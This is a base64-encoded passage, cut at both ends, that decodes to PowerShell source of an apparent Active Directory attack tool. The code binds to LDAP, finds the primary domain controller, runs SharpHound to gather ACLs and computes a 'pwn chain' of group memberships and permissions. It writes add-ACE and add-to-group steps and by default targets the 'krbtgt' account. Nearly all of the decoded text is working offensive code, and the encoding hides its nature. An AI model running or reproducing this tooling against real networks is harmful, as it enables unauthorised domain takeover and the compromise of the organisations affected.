ZS1BQ0xQd24ubG9nJyAtQXBwZW5kCiAgICB9CgoKICAgICMgQ2hlY2sgaWYgY29tcHV0ZXIgaXMgcGFydCBvZiB0aGUgZG9tYWluCiAgICAkcGFydE9mRG9tYWluID0gKEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0NvbXB1dGVyU3lzdGVtKS5QYXJ0T2ZEb21haW4KCiAgICBpZiAoLW5vdCAkcGFydE9mRG9tYWluIC1hbmQgKC1ub3QgJHVzZXJuYW1lIC1vciAtbm90ICRwYXNzd29yZCAtb3IgLW5vdCAkZG9tYWluKSl7ICAgICAgICAKICAgICAgICBXcml0ZS1CYWQgJ0NvbXB1dGVyIGlzIG5vdCBwYXJ0IG9mIGEgZG9tYWluLiBQbGVhc2Ugc3BlY2lmeSBjcmVkZW50aWFscy4nCiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfQoKICAgIGlmICgtbm90ICRwYXJ0T2ZEb21haW4gLWFuZCAtbm90ICRpbnRlZ3JhdGVkTG9naW4pIHsKICAgIAogICAgICAgIGlmICgkZ2xvYmFsOmxkYXBDb25uSW5mby51c2VybmFtZS5Db250YWlucygiXCIpKXsKICAgICAgICAgICAgJGdsb2JhbDpsZGFwQ29ubkluZm8udXNlcm5hbWUgPSAkZ2xvYmFsOmxkYXBDb25uSW5mby51c2VybmFtZS5TcGxpdCgiXCIpWzFdCiAgICAgICAgfQoKICAgICAgICAjIFdyaXRlIEFkZHRvR3JvdXAgYW5kIEFkZC1BQ0wgdG8gZmlsZQogICAgICAgIFdyaXRlLUFkZEFDRVRvRmlsZQogICAgICAgIFdyaXRlLUFkZFRvR3JvdXBUb0ZpbGUKICAgIH0KICAgIAogICAgIyBDaGVjayBpZiBkb21haW4gaXMgc3BlY2lmaWVkLiBJZiBub3QsIGFuZCB3ZSdyZSBwYXJ0IG9mIHRoZSBkb21haW4gdHJ5IHRvIHJlc29sdmUgaXQKICAgIGlmIChbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkZ2xvYmFsOmxkYXBDb25uSW5mby5kb21haW4pKXsKICAgICAgICBpZiAoJHBhcnRPZkRvbWFpbil7CiAgICAgICAgICAgICRnbG9iYWw6bGRhcENvbm5JbmZvLmRvbWFpbiA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldEN1cnJlbnREb21haW4oKS5OYW1lCiAgICAgICAgICAgICRnbG9iYWw6bGRhcENvbm5JbmZvLkludGVncmF0ZWRfTG9naW4gPSAkdHJ1ZQoKICAgICAgICAgICAgaWYgKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRwcm90b2NvbCkpIHsKICAgICAgICAgICAgICAgICRwcm90b2NvbCA9ICdMREFQJwogICAgICAgICAgICB9CgogICAgICAgICAgICAkZ2xvYmFsOmxkYXBDb25uSW5mby5wcm90b2NvbCA9ICRwcm90b2NvbAogICAgICAgICAgICAkZ2xvYmFsOmxkYXBDb25uSW5mby5MREFQQ29ublN0cmluZyAgPSAiJCgkZ2xvYmFsOmxkYXBDb25uSW5mby5wcm90b2NvbCk6Ly8kKCRnbG9iYWw6bGRhcENvbm5JbmZvLmRvbWFpbikiCiAgICAgICAgfSBlbHNlIHsgICAgICAgIAogICAgICAgICAgICBXcml0ZS1CYWQgJ0NvbXB1dGVyIGlzIG5vdCBwYXJ0IG9mIGEgZG9tYWluLiBQbGVhc2Ugc3BlY2lmeSBkb21haW4uJwogICAgICAgICAgICByZXR1cm4gJGZhbHNlCiAgICAgICAgfQogICAgfQoKICAgICAjIEdldCBjdXJyZW50IHVzZXJuYW1lIGlmIG5vbmUgaXMgZ2l2ZW4KICAgIGlmIChbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkZ2xvYmFsOmxkYXBDb25uSW5mby51c2VybmFtZSkpIHsKICAgICAgICAkZ2xvYmFsOmxkYXBDb25uSW5mby51c2VybmFtZSA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpVc2VyTmFtZQogICAgICAgIFdyaXRlLVN0YXR1cyAiSW50ZWdyYXRlZCBsb2dpbiwgdXNpbmcgYWNjb3VudCAnJCgkZ2xvYmFsOmxkYXBDb25uSW5mby51c2VybmFtZSknIgogICAgfQoKICAgICMgQ2hlY2sgaWYgd2UgY2FuIGxvZ2luCiAgICBXcml0ZS1TdGF0dXMgJ0NoZWNraW5nIGlmIHdlIGNhbiBiaW5kIHRvIEFELi4uJwogICAgJGRpckVudHJ5ID0gR2V0LURpckVudHJ5IC1sZGFwRE4gJGdsb2JhbDpsZGFwQ29ubkluZm8uTERBUENvbm5TdHJpbmcgICAgCgogICAgaWYgKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRkaXJFbnRyeS5EaXN0aW5ndWlzaGVkTmFtZSkpIHsKICAgICAgICBXcml0ZS1CYWQgJ1tDaGVjay1FbnZdIFVuYWJsZSB0byBjb25uZWN0LiBDaGVjayBzZXR0aW5ncy4nCiAgICAgICAgJHJlc3VsdCA9ICRmYWxzZQogICAgfQogICAgZWxzZSB7ICAgCiAgICAgICAgV3JpdGUtU3RhdHVzICdTdWNjZXNmdWxseSBib3VuZCB0byBBRCB3aXRoIHN1cHBsaWVkIGluZm8uJwogICAgfQoKICAgIGlmICgtbm90ICRkaXJFbnRyeS5EaXNwb3NlZCkgewogICAgICAgICRkaXJFbnRyeS5DbG9zZSgpCiAgICAgICAgJGRpckVudHJ5LkRpc3Bvc2UoKQogICAgfQoKICAgICMgR2V0IGRvbWFpbiBETgogICAgJGRvbWFpbkROID0gR2V0LURvbWFpbkROCiAgICAkZ2xvYmFsOkFESW5mby5kb21haW5ETiA9ICRkb21haW5ETgoKICAgICMgR2V0IFBEQwogICAgV3JpdGUtU3RhdHVzICdGaW5kaW5nIHByaW1hcnkgREMuLi4nCiAgICAkcGRjID0gR2V0LVByaW1hcnlEQzM1CgogICAgaWYgKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRwZGMpKSB7CiAgICAgICAgV3JpdGUtQmFkICdXZSBuZWVkIGEgKHByaW1hcnkpIGRvbWFpbkNvbnRyb2xsZXIgZm9yIHRoaXMgdG8gd29yay4gU3RvcHBpbmcuLi4nCiAgICAgICAgJHJlc3VsdCA9ICRmYWxzZQogICAgfQogICAgZWxzZSB7CiAgICAgICAgV3JpdGUtU3RhdHVzICJGb3VuZCBQREMgJyRwZGMnIgogICAgICAgICRnbG9iYWw6QURJbmZvLnByaW1hcnlEQyA9ICRwZGMKICAgIH0KCiAgICAjIEdldCBuYW1pbmctIGFuZCBzY2hlbWEgY29udGV4dCBETgogICAgV3JpdGUtU3RhdHVzICdGaW5kaW5nIE5hbWluZyBjb250ZXh0IGZvciBDb25maWd1cnVyYXRpb24gYW5kIFNjaGVtYSBzdG9yZXMgcGFydGl0aW9ucy4uLicKICAgIEdldC1TY2hlbWFBbmRDb25maWdDb250ZXh0CiAgICBXcml0ZS1TdGF0dXMgIkZvdW5kIGNvbmZpZ3N0b3JlOiAkKCRnbG9iYWw6QURJbmZvLkNvbmZpZ3VyYXRpb25OYW1pbmdDb250ZXh0KSIKICAgIFdyaXRlLVN0YXR1cyAiRm91bmQgc2NoZW1hc3RvcmU6ICQoJGdsb2JhbDpBREluZm8uc2NoZW1hTmFtaW5nQ29udGV4dCkiCgoKICAgICMgZmluZCBhZGRpdGlvbmFsIGluZm8gYWJvdXQgdXNlcgogICAgJGF0dHIgPSBAKCd1c2VyUHJpbmNpcGFsTmFtZScsJ2Rpc3Rpbmd1aXNoZWROYW1lJywnc0FNQWNjb3VudE5hbWUnKQogICAgJGF0dHJzID0gR2V0LUF0dHJGb3JBRE9iamVjdCAtb2JqZWN0TmFtZSAkZ2xvYmFsOmxkYXBDb25uSW5mby51c2VybmFtZSAtcHJvcHMgJGF0dHIKICAgICRnbG9iYWw6bGRhcENvbm5JbmZvLnNBTUFjY291bnROYW1lICAgID0gJGF0dHJzWydzYW1hY2NvdW50bmFtZSddWzBdCiAgICAkZ2xvYmFsOmxkYXBDb25uSW5mby51c2VyUHJpbmNpcGFsTmFtZSA9ICRhdHRyc1sndXNlcnByaW5jaXBhbG5hbWUnXVswXQogICAgJGdsb2JhbDpsZGFwQ29ubkluZm8uZGlzdGluZ3Vpc2hlZE5hbWUgPSAkYXR0cnNbJ2Rpc3Rpbmd1aXNoZWRuYW1lJ11bMF0KCiAgICBpZiAoW3N0cmluZ106OklzTnVsbE9yRW1wdHkoJFNoYXJwSG91bmRMb2NhdGlvbikpIHsKICAgICAgICAgV3JpdGUtQmFkICdTaGFycEhvdW5kIG5vdCBmb3VuZC4gUGxlYXNlIHNwZWNpZnkgc2hhcnBob3VuZCBsb2NhdGlvbicKICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkU2hhcnBIb3VuZExvY2F0aW9uKSl7CiAgICAgICAgV3JpdGUtQmFkICdTaGFycEhvdW5kIG5vdCBmb3VuZC4gUGxlYXNlIHNwZWNpZnkgc2hhcnBob3VuZCBsb2NhdGlvbicKICAgICAgICAkcmVzdWx0ID0gJGZhbHNlCiAgICB9CgogICAgIyBUZXN0IGlmICR1c2VyQWNjb3VudFRvUHduIGV4aXN0cwogICAgaWYgKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCR1c2VyQWNjb3VudFRvUHduKSkgewogICAgICAgICR1c2VyQWNjb3VudFRvUHduID0gJ2tyYnRndCcKICAgIH0KICAgICRhY2MgPSBHZXQtQXR0ckZvckFET2JqZWN0ICR1c2VyQWNjb3VudFRvUHduIC1wcm9wcyAnc0FNQWNjb3VudE5hbWUnIAogICAgaWYgKCRhY2MgLWVxICRudWxsKSB7CiAgICAgICAgV3JpdGUtU3RhdHVzICJBY2NvdW50ICckdXNlckFjY291bnRUb1B3bicgbm90IGZvdW5kIGluIEFELiBrcmJ0Z3QgYWNjb3VudCB3aWxsIGJlIHVzZWQuIgogICAgICAgICR1c2VyQWNjb3VudFRvUHduID0gJ2tyYnRndCcKICAgIH0KCiAgICByZXR1cm4gJHJlc3VsdAp9CiNlbmRyZWdpb24KCiNyZWdpb24gSGFja1B3blN0dWZmCgpmdW5jdGlvbiBHZXQtQUNMU3RyaW5nKCRyZWYpIHsKCiAgICByZXR1cm4gKCJ7MH17MX17Mn17M317NH17NX17Nn17N30iIC1mIGAKICAgICAgICAkcmVmLk9iamVjdE5hbWUsCiAgICAgICAgJHJlZi5PYmplY3RUeXBlLAogICAgICAgICRyZWYuUHJpbmNpcGFsTmFtZSwKICAgICAgICAkcmVmLlByaW5jaXBhbFR5cGUsCiAgICAgICAgJHJlZi5BY3RpdmVEaXJlY3RvcnlSaWdodHMsCiAgICAgICAgJHJlZi5BQ0VUeXBlLAogICAgICAgICRyZWYuQWNjZXNzQ29udHJvbFR5cGUsCiAgICAgICAgJHJlZi5Jc0luaGVyaXRlZCwKICAgICAgICAkcmVmLk9iamVjdEd1aWQpCn0KCmZ1bmN0aW9uIEdldC1Qd25DaGFpbiAoJG9iakFDTCwgJGdyb3VwTWVtYmVyc2hpcCkgewoKICAgICRwcm9jZXNzZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QgCiAgICAkY2hlY2tMaXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CgogICAgZm9yZWFjaCAoJGEgaW4gJG9iakFDTCB8IEZvckVhY2gtT2JqZWN0IHskXy5QcmluY2lwYWxOYW1lfSl7CgogIAogICAgICAgICMgR2V0IEFDTCBmb3IgdGhlIElkIHJlZiBvZiB0aGUgQUNFLiAKICAgICAgICAjIENoZWNrIGlmIHdlIGhhdmVudCBjaGVja2VkIHRoaXMgQUNFIGJlZm9yZQogICAgICAgICRhQWNsID0gQCgpCiAgICAgICAgCiAgICAgICAgJEFDTCB8IFdoZXJlLU9iamVjdCB7JF8ub2JqZWN0TmFtZSAtZXEgJGF9IHwgRm9yRWFjaC1PYmplY3QgeyAgICAgICAgICAKICAgICAgICAgICAgI1t2b2lkXSRwcm9jZXNzZWQuQWRkKCRfKSAgICAgICAgICAgIAogICAgICAgICAgICAkYUFjbCArPSAkXwogICAgICAgIH0KCiAgICAgICAgIyBJdGVyYXRlIHRocm91Z2ggdGhlIEFDTCBvZiB0aGUgQUNFIElkIHJlZgogICAgICAgICMgVG9kbzogY2hlY2sgYWNjZXNzdHlwZS4gU2tpcCByZWFkIGVudHJpZXMgICAgICAgIAogICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJGFBY2wuQ291bnQ7ICRpKyspewoKICAgICAgICAgICAgJHN1YkFDTCA9ICRhQWNsWyRpXSAgICAgICAgCgogICAgICAgICAgICAjIEdldCBBQ0wgZm9yIHRoaXMgcmVzb3VyY2UgYW5kIGFkZCBpdCB0byB0aGUgcXVldWUKICAgICAgICAgICAgJEFDTCB8IFdoZXJlLU9iamVjdCB7JF8ub2JqZWN0TmFtZSAtZXEgIiQoJHN1YkFDTC5QcmluY2lwYWxOYW1lKSJ9IHwgRm9yRWFjaC1PYmplY3QgeyAgICAKCiAgICAgICAgICAgICAgICAkYVN0ciA9IEdldC1BQ0xTdHJpbmcgJF8gICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAkY2hlY2tMaXN0LkNvbnRhaW5zKCRhU3RyKSl7CiAgICAgICAgICAgICAgICAgICAgW3ZvaWRdJGNoZWNrTGlzdC5BZGQoJGFTdHIpCiAgICAgICAgICAgICAgICAgICAgJGFBY2wgKz0gJF8KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBDaGVjayBtZW1iZXJzIG9mIHRoaXMgZ3JvdXAuIFdlIGtub3cgd2UgYXJlIG5vdCBhIG1lbWJlciBvZiB0aGlzIGdyb3VwIHNpbmNlIHdlIGFscmVhZHkgcmVxdWVzdGVkIG91cgogICAgICAgICAgICAjIHJlY3Vyc2l2ZSBncm91cG1lbWJlcnNoaXAsIGJ1dCBpdCBjb3VsZCBsZWFkIHRvIG93bmFnZSBpZiB3ZSBjYW4gbW9kaWZ5IHRoZSBjaGlsZHJlbgogICAgICAgICAgICAkZ3JvdXBDaGlsZGVyZW4gPSBHZXQtR3JvdXBNZW1iZXIgLW9iamVjdE5hbWUgJHN1YkFDTC5QcmluY2lwYWxOYW1lICAgICAgICAKCiAgICAgICAgICAgICMgR2V0IEFDTCBmb3IgZXZlcnkgY2hpbGQgYW5kIGFkZCB0aGVtIHRvIHRoZSBxdWV1ZQogICAgICAgICAgICBmb3JlYWNoICgkY2hpbGQgaW4gJGdyb3VwQ2hpbGRlcmVuKSB7ICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkQUNMIHwgV2hlcmUtT2JqZWN0IHskXy5vYmplY3ROYW1lIC1saWtlICIkKCRjaGlsZC5OVEFjY291bnQpKiJ9IHwgRm9yRWFjaC1PYmplY3QgeyAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICRhU3RyID0gR2V0LUFDTFN0cmluZyAkXyAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkY2hlY2tMaXN0LkNvbnRhaW5zKCRhU3RyKSl7CiAgICAgICAgICAgICAgICAgICAgICAgIFt2b2lkXSRjaGVja0xpc3QuQWRkKCRhU3RyKQogICAgICAgICAgICAgICAgICAgICAgICAkYUFjbCArPSAkXwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CgogICAgICAgICAgICAjIEtlZXAgdHJhY2sgb2Ygd2hhdCB3ZSBhbHJlYWR5IGhhdmUgcHJvY2Vzc2VkCiAgICAgICAgICAgIFt2b2lkXSRwcm9jZXNzZWQuQWRkKCRzdWJBQ0wpICAgICAgICAgICAgCgogICAgICAgICAgICBpZiAoJHByb2Nlc3NlZC5Db3VudCAlIDI1IC1lcSAwKXsKICAgICAgICAgICAgICAgIFdyaXRlLVN0YXR1cyAiUHJvY2Vzc2VkICQoJHByb2Nlc3NlZC5Db3VudCkgQUNMcyBzbyBmYXIuLi4iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgIyBUT0RPOiB0bXAgZml4LCBtYWtlIHByb2Nlc3NlZGxpc3QgdW5pcXVlICAgIAogICAgJHByb2Nlc3NlZCA9ICRwcm9jZXNzZWQgfCBTb3J0LU9iamVjdCAtUHJvcGVydHkgT2JqZWN0TmFtZSwgT2JqZWN0VHlwZSwgUHJpbmNpcGFsTmFtZSwgUHJpbmNpcGFsVHlwZSwgQWN0aXZlRGlyZWN0b3J5UmlnaHRzLCBBQ0VUeXBlLCBBY2Nlc3NDb250cm9sVHlwZSwgSXNJbmhlcml0ZWQsIE9iamVjdEd1aWQgLVVuaXF1ZQoKICAgICMgQ2hlY2sgaWYgd2UgYXJlIG1lbWJlciBvZiBvbmUgb2YgdGhlIHByb2Nlc3NlZCBncm91cHMKICAgICRwd25hYmxlSWRzID0gJGdyb3VwTWVtYmVyc2hpcCB8IFdoZXJlLU9iamVjdCB7CiAgICAgICAgJHByb2Nlc3NlZC5QcmluY2lwYWxOYW1lIC1saWtlICIkKCRfLk5UQWNjb3VudCkqIgogICAgfQoKICAgICRwd25DaGFpbiA9IEAoKQoKICAgIGZvcmVhY2ggKCRwd25JRCBpbiAkcHduYWJsZUlkcykgewogICAgICAgICMgZmluZCBBQ0Ugd2hlcmUgdGhpcyBOVEFjY291bnQgaXMgdGhlIHByaW5jaXBsZQogICAgICAgICR1blJlc29sdmVkID0gJHRydWUKICAgICAgICAkX3B3bkNoYWluID0gQCgpCgogICAgICAgICRpZFJlZiA9ICIkKCRwd25JRC5OVEFjY291bnQpQCQoJGdsb2JhbDpsZGFwQ29ubkluZm8uZG9tYWluKSIKCiAgICAgICAgZG8gewoKICAgICAgICAgICAgIyBUT0RPOiBmaXggd2hlbiBtdWx0aXBsZSByZWZlcmVuY2VzIGFyZSBmb3VuZAogICAgICAgICAgICAkcmVsYXRlZEFDRSA9ICRwcm9jZXNzZWQgfCBXaGVyZS1PYmplY3QgeyRfLlByaW5jaXBhbE5hbWUgLWVxICRpZFJlZiB9IAoKICAgICAgICAgICAgaWYgKCRyZWxhdGVkQUNFLkNvdW50IC1ndCAxKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1TdGF0dXMgJ0ZvdW5kIG11bHRpcGxlIHBvdGVudGlhbCBwYXRocyB0byBBRCBwd25hZ2UuIFVzaW5nIHRoZSBmaXJzdCBncm91cCB0aGF0IHdhcyBwcm9jZXNzZWQuIExhdGVyIG9uLCBtdWx0aXBsZSBwYXRocyB3aWxsIGJlIHN1cHBvcnRlZC4nCiAgICAgICAgICAgICAgICAkcmVsYXRlZEFDRSA9ICRyZWxhdGVkQUNFWzBdCiAgICAgICAgICAgICAgICAkdW5SZXNvbHZlZCA9ICRmYWxzZQogICAgICAgICAgICB9ICAgIAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCRyZWxhdGVkQUNFIC1lcSAkbnVsbCl7CgogICAgICAgICAgICAgICAgIyBObyBBQ0UgYXZhaWxhYmxlLiBDaGVjayBpZiBncm91cCBpcyBhIGRpcmVjdCghKSBtZW1iZXIgb2YgdGhlIGdyb3VwIGluIHRoZSB1cHBlciBsYXllcgogICAgICAgICAgICAgICAgJG1lbWJlck9mR3JvdXAgPSBHZXQtR3JvdXBtZW1iZXJzaGlwIC1vYmpOYW1lICRpZFJlZiAtcmVjdXJzaXZlICRmYWxzZSAKCiAgICAgICAgICAgICAgICAkaXNNZW1iZXJPZkdyb3VwID0gJG1lbWJlck9mR3JvdXAgfCBXaGVyZS1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRvYmpBQ0wuUHJpbmNpcGFsTmFtZSAtZXEgIiQoJF8uTlRBY2NvdW50KUAkKCRnbG9iYWw6bGRhcENvbm5JbmZvLmRvbWFpbikiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRpc01lbWJlck9mR3JvdXAgLW5lICRudWxsKXsKICAgICAgICAgICAgICAgICAgICAjZG9uZSA6KQogICAgICAgICAgICAgICAgICAgICRfcHduQ2hhaW4gKz0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgICAgICAgICAgICAgJ1R5cGUnID0gJ0dyb3VwTWVtYmVyc2hpcCcKICAgICAgICAgICAgICAgICAgICAgICAgJ09iamVjdCcgPSAkaWRSZWYKICAgICAgICAgICAgICAgICAgICB9ICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgICAgICAgICAkdW5SZXNvbHZlZCA9ICRmYWxzZQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJHVuUmVzb2x2ZWQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgIyBBZGQgaWRSZWYgQUNFIHRvIHB3bkNoYWluCiAgICAgICAgICAgICRfcHduQ2hhaW4gKz0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgICAgICdUeXBlJyA9ICdBQ0wnCiAgICAgICAgICAgICAgICAnT2JqZWN0JyA9ICRyZWxhdGVkQUNFCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCgogICAgICAgICAgICAjIFNldCAkaWRSRWYgdG8gb2JqZWN0TmFtZSB0aGF0IGlzIG1lbnRpb25lZCBpbiAkcmVsYXRlZEFDRQogICAgICAgICAgICAkaWRSZWYgPSAkcmVsYXRlZEFDRS5PYmplY3ROYW1lCgogICAgICAgIH13aGlsZSgkdW5SZXNvbHZlZCkKCiAgICAgICAgJHB3bkNoYWluICs9ICRfcHduQ2hhaW4KICAgIH0KCiAgICByZXR1cm4gJHB3bkNoYWluCn0KCmZ1bmN0aW9uIEltcG9ydC1DU1ZBQ0wgKCRjc3ZMb2NhdGlvbikgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJGNzdkxvY2F0aW9uKSkgewogICAgICAgIFdyaXRlLUVycm9yICgiW0ltcG9ydC1BQ0xdIEZpbGUgJ3swfScgbm90IGZvdW5kLiIgLWYgJGNzdkxvY2F0aW9uKQogICAgICAgIHJldHVybiBudWxsCiAgICB9CgogICAgIyBSZXR1cm4gdGhlIEFDRSB3aGVyZSBhbGxvd2VkVHlwZSAtZXEgVHJ1ZQogICAgJF90bXAgPSBJbXBvcnQtQ3N2ICRjc3ZMb2NhdGlvbgogICAgJHIgPSAkX3RtcCB8IFdoZXJlLU9iamVjdCB7JF8uQWNjZXNzQ29udHJvbFR5cGUgLWVxICdBY2Nlc3NBbGxvd2VkJ30KCiAgICByZXR1cm4gJHIKfQoKZnVuY3Rpb24gSXMtTmV3U2hhcnBob3VuZFZlcnNpb24oW3N0cmluZ10kc2hhcnBob3VuZExvY2F0aW9uKXsKCiAgICAkcmVzdWx0ID0gJGZhbHNlCgogICAgIyBEaXJ0eSBoYWNrIHRvIGdldCBzaGFycGhvdW5kIHZlcnNpb24gOigKICAgICR0bXBQYXRoID0gW3N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKQogICAgU3RhcnQtcHJvY2VzcyAtd2FpdCAtV2luZG93U3R5bGUgSGlkZGVuIC1maWxlUGF0aCAkc2hhcnBob3VuZExvY2F0aW9uIC1Bcmd1bWVudExpc3QgIi1oIiAtUmVkaXJlY3RTdGFuZGFyZEVycm9yICIkdG1wUGF0aFxvdXQyLnR4dCIKCiAgICAkc2hhcnBIb3VuZEhlbHAgPSBHZXQtQ29udGVudCAiJHRtcFBhdGhcb3V0Mi50eHQiICAgIAogICAgJHNoYXJwaG91bmRWZXJzaW9uID0gKCRzaGFycEhvdW5kSGVscCAtc3BsaXQgJ2ByYG4nKVswXQogICAgV3JpdGUtU3RhdHVzICJSdW5uaW5nICQoJHNoYXJwaG91bmRWZXJzaW9uKS4uLiIgCgogICAgaWYgKCRzaGFycGhvdW5kVmVyc2lvbi5Ub0xvd2VyKCkuQ29udGFpbnMoInNoYXJwaG91bmQgdjIiKSl7CiAgICAgICAgJHJlc3VsdCA9ICR0cnVlCiAgICB9CgogICAgUmVtb3ZlLUl0ZW0gIiR0bXBQYXRoXG91dDIudHh0IgogICAgcmV0dXJuICRyZXN1bHQKfQoKZnVuY3Rpb24gR2V0LVNoYXJwSG91bmRBQ0wgKFtzdHJpbmddJHNoYXJwSG91bmRMb2NhdGlvbiwgJGlzTmV3VmVyc2lvbikgewogICAgCiAgICAkZmlsZU5hbWUgPSBbc3RyaW5nXTo6RW1wdHkKICAgICRhcmcgPSBbc3RyaW5nXTo6RW1wdHkKCiAgICBpZiAoJGlzTmV3VmVyc2lvbil7CiAgICAgICAgJGZpbGVOYW1lID0gInswfS56aXAiIC1mIFtkYXRldGltZV06Ok5vdy5Ub0ZpbGVUaW1lKCkKICAgICAgICAkYXJnID0gIiQoJGdsb2JhbDpsZGFwQ29ubkluZm8uZG9tYWluKSAtYyBhY2wgLS1aaXBGaWxlTmFtZSAkKCRmaWxlTmFtZSkgLS1Ob1NhdmVDYWNoZSIKICAgIH0gZWxzZSB7CiAgICAgICAgJGZpbGVOYW1lID0gInswfSIgLWYgW2RhdGV0aW1lXTo6Tm93LlRvRmlsZVRpbWUoKQogICAgICAgICRhcmcgPSAiLWQgJCgkZ2xvYmFsOmxkYXBDb25uSW5mby5kb21haW4pIC1jIGFjbCAtLUNTVlByZWZpeCAkKCRmaWxlTmFtZSkgLS1Ob1NhdmVDYWNoZSIKICAgIH0KCiAgICBJbnZva2UtQ21kIC1jbWQgJHNoYXJwSG91bmRMb2NhdGlvbiAtYXJnViAkYXJnCgogICAgJHN0aWxsUnVucyAgICAgPSAkdHJ1ZQogICAgJG1heFNsZWVwVGltZSAgPSAxMCAjIEluIG1pbnV0ZXMgCiAgICAkc2xlZXBFbGFwc2VkICA9IDAKICAgICRzbGVlcEludGVydmFsID0gNSAgIyBJbiBzZWNvbmRzCiAgICAKICAgICMgU2xlZXAgYSBsaXR0bGUsIGNoZWNrIGlmIGZpbGUgZXhpc3RzIGlmIHdlIHdha2UgdXAKICAgIFN0YXJ0LVNsZWVwICRzbGVlcEludGVydmFsCiAgICAkZmlsZSA9IEdldC1DaGlsZEl0ZW0gLUZpbHRlciAiJGZpbGVOYW1lKiIKICAgIGlmICgkZmlsZSAtbmUgJG51bGwpIHsKICAgICAgICByZXR1cm4gJGZpbGVbMF0uRnVsbE5hbWUKICAgIH0KCiAgICBkbyB7CiAgICAgICAgIyBjaGVjayBpZiBzaGFycGhvdW5kIGlzIHN0aWxsIHJ1bm5pbmcKICAgICAgICAkcCA9IEdldC1Qcm9jZXNzICcqU2hhcnBIb3VuZC5leGUnCiAgICAgICAgaWYgKCRwIC1lcSAkbnVsbCkgewogICAgICAgICAgICAkc3RpbGxSdW5zID0gJGZhbHNlCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgIyBTbGVlcCA1IHNlY29uZHMKICAgICAgICAgICAgU3RhcnQtU2xlZXAoJHNsZWVwSW50ZXJ2YWwpCiAgICAgICAgICAgICRzbGVlcEVsYXBzZWQgKz0gJHNsZWVwSW50ZXJ2YWwKCiAgICAgICAgICAgIGlmICgoJG1heFNsZWVwVGltZSAqMTApIC1sZSAkc2xlZXBFbGFwc2VkKXsKICAgICAgICAgICAgICAgIFdyaXRlLVN0YXR1cyAnW0dldC1TaGFycEhvdW5kQUNMXSBTaGFycGhvdW5kIGlzIHN0aWxsIHJ1bm5pbmcuIERvIHlvdSB3YW50IHRvIGNvbnRpbnVlIGZvciAxMCBtb3JlIG1pbnV0ZXM/JyAKICAgICAgICAgICAgICAgICRhbnN3ID0gUmVhZC1Ib3N0ICdZL04nCiAgICAgICAgICAgICAgICBpZiAoJGFuc3cuVG9Mb3dlcigpIC1lcSAneScpIHsKICAgICAgICAgICAgICAgICAgICAkbWF4U2xlZXBUaW1lICs9IDEwCiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRzdGlsbFJ1bnMgPSAkZmFsc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0gICAgICAgIAogICAgfXdoaWxlICgkc3RpbGxSdW5zKQogICAgCiAgICAjIENoZWNrIGZvciBmaWxlIHdpdGggZ2l2ZW4gcHJlZml4CiAgICAkZmlsZSA9IEdldC1DaGlsZEl0ZW0gLUZpbHRlciAiJGZpbGVOYW1lKiIKICAgIGlmICgkZmlsZSAtZXEgJG51bGwpIHsKICAgICAgICBXcml0ZS1FcnJvciAnW0dldC1TaGFycEhvdW5kQUNMXSBObyBBQ0wgaW5wdXQgYXZhaWxhYmxlLicKICAgICAgICByZXR1cm4gJG51bGwKICAgIH0KCiAgICByZXR1cm4gJGZpbGVbMF0uRnVsbE5hbWUKfQoKZnVuY3Rpb24gSW1wb3J0LUpzb25BQ0wgKFtzdHJpbmddJHNoYXJwSG91bmRaaXBGaWxlTG9jYXRpb24pewoKICAgICMgdW56aXAgZmlsZQogICAgJGZJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uRmlsZUluZm8gJHNoYXJwSG91bmRaaXBGaWxlTG9jYXRpb24KICAgICRwYXJlbnRGb2xkZXIgPSAkZkluZm8uRGlyZWN0b3J5LkZ1bGxOYW1lCiAgICBVbnppcC1BcmNoaXZlIC16aXBhcmNoaXZlICRzaGFycEhvdW5kW